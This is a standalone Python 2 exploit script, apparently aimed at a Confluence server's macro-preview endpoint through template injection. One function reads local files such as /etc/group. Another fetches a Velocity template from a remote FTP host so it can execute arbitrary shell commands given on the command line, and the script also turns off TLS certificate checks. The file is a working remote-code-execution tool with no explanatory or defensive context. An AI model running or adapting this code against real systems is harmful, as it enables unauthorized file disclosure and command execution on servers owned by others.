# -*- coding: utf-8 -*-
import re
import sys
import requests
import ssl
try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context

def _read(url):
    result = {}
    # filename = "../web.xml"
    filename = 'file:////etc/group'

    paylaod = url + "/rest/tinymce/1/macro/preview"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
        "Referer": url + "/pages/resumedraft.action?draftId=12345&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
        "Content-Type": "application/json; charset=utf-8"
    }
    data = '{"contentId":"12345","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"%s"}}}' % filename
    r = requests.post(paylaod, data=data, headers=headers)
    # print r.content
    if r.status_code == 200 and "wiki-content" in r.text:
        m = re.findall('.*wiki-content">\n(.*)\n            </div>\n', r.text, re.S)

    return m[0]



def _exec(url,cmd):
    result = {}
    filename = "ftp://1.1.1.1/cmd.vm"

    paylaod = url + "/rest/tinymce/1/macro/preview"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
        "Referer": url + "/pages/resumedraft.action?draftId=12345&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
        "Content-Type": "application/json; charset=utf-8"
    }
    data = '{"contentId":"12345","macro":{"name":"widget","body":"","params":{"url":"http://www.dailymotion.com/video/xcpa64","width":"300","height":"200","_template":"%s","cmd":"%s"}}}' % (filename,cmd)
    r = requests.post(paylaod, data=data, headers=headers)
    # print r.content
    if r.status_code == 200 and "wiki-content" in r.text:
        m = re.findall('.*wiki-content">\n(.*)\n            </div>\n', r.text, re.S)

    return m[0]



if __name__ == '__main__':

    if len(sys.argv) != 3:
        print 'Usage: RCE_exp.py http[s]://target.com:8080/ "ls -al"'
        sys.exit(0)
    url = sys.argv[1]
    cmd = sys.argv[2]
    print _exec(url,cmd)
